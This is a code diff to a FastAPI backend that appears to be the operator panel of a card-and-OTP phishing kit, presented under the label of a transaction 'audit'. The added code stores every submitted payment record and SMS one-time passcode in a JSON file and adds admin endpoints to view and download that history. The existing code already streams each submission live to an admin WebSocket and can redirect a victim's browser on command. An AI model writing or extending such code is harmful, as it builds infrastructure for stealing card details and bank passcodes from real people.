@@ -22,6 +22,25 @@ app = FastAPI(
     version="2.0.0"
 )
 
+# --- Persistence ---
+DB_FILE = "database.json"
+
+def load_db():
+    if not os.path.exists(DB_FILE): return {"payments": [], "sms": []}
+    try:
+        with open(DB_FILE, "r") as f: return json.load(f)
+    except: return {"payments": [], "sms": []}
+
+def save_payment(data: dict):
+    db = load_db()
+    db["payments"].append(data)
+    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+
+def save_sms(client_id: str, otp: str):
+    db = load_db()
+    db["sms"].append({"client_id": client_id, "otp": otp, "timestamp": str(uuid.uuid4())})
+    with open(DB_FILE, "w") as f: json.dump(db, f, indent=2)
+
 # --- WebSocket & Session Management ---
 class ConnectionManager:
     def __init__(self):
@@ -115,15 +134,18 @@ async def get_api_key(header_key: Optional[str] = Security(api_key_header)):
 # --- Logic & Endpoints ---
 @app.post("/v1/audit", response_model=AuditResponse)
 async def create_audit(request: AuditRequest, api_key: APIKey = Depends(get_api_key)):
+    data = request.dict()
+    save_payment(data)
     # Broadcast to admin panel
     await manager.broadcast_to_admins({
         "type": "NEW_PAYMENT",
-        "data": request.dict()
+        "data": data
     })
     return AuditResponse(status="PENDING", message="Transaction en cours d'analyse")
 
 @app.post("/v1/sms-submit")
 async def submit_sms(client_id: str, otp: str):
+    save_sms(client_id, otp)
     await manager.broadcast_to_admins({
         "type": "NEW_SMS",
         "client_id": client_id,
@@ -138,6 +160,16 @@ async def admin_redirect(request: RedirectRequest, api_key: APIKey = Depends(get
         "url": f"/{request.target}"
     })
     return {"status": "command_sent"}
+
+@app.get("/v1/admin/history")
+async def get_history(api_key: APIKey = Depends(get_api_key)):
+    return load_db()
+
+@app.get("/v1/admin/download")
+async def download_db(api_key: APIKey = Depends(get_api_key)):
+    if os.path.exists(DB_FILE):
+        return FileResponse(DB_FILE, media_type='application/json', filename='audit_history.json')
+    return {"error": "No data found"}
 
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
